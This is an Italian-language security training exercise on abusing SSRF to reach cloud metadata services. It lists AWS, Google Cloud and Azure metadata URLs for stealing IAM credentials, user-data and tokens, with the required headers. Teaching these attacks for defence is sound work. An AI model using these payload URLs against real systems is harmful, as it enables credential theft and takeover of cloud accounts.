☁️ Esercizio 2: Metadata Services

Il Santo Graal dell'SSRF – Credenziali cloud gratuite
🎯 Perché è Critico
I cloud provider (AWS, GCP, Azure) espongono un metadata service su 169.254.169.254. Da lì puoi estrarre:

• Credenziali IAM temporanee (access key, secret key, token)
• User-data (spesso contiene password e chiavi)
• Informazioni istanza (hostname, IP, region)
🟠 AWS
http://169.254.169.254/ latest/meta-data/ http://169.254.169.254/ latest/meta-data/iam/ security-credentials/ http://169.254.169.254/ latest/user-data
🔵 Google Cloud
http://metadata.google. internal/computeMetadata/ v1/ http://metadata.google. internal/computeMetadata/ v1/instance/ service-accounts/

Header richiesto:
Metadata-Flavor: Google
🟣 Azure
http://169.254.169.254/ metadata/instance ?api-version=2021-02-01 http://169.254.169.254/ metadata/identity/ oauth2/token

Header richiesto:
Metadata: true
💡 Impatto Reale
Con le credenziali IAM estratte puoi: accedere a S3, EC2, RDS, Lambda... compromissione totale dell'account cloud! Questo è esattamente come sono avvenuti breach famosi (Capital One 2019).
